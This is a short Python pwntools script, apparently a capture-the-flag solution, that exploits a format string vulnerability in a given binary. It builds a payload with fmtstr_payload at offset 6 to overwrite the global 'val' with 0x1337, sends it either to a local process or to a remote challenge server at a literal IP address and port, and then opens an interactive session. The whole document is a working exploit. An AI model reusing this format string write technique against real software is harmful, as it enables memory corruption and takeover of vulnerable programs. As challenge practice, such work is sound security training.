from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('107.178.209.165',5337)
    else:
        return process(e.path)


p = start()

val = e.sym['val']
desired_val= 0x1337

payload_writes = {
         val : desired_val,
}

payload = fmtstr_payload(6,payload_writes,write_size='short')
p.sendline(payload)
p.interactive()


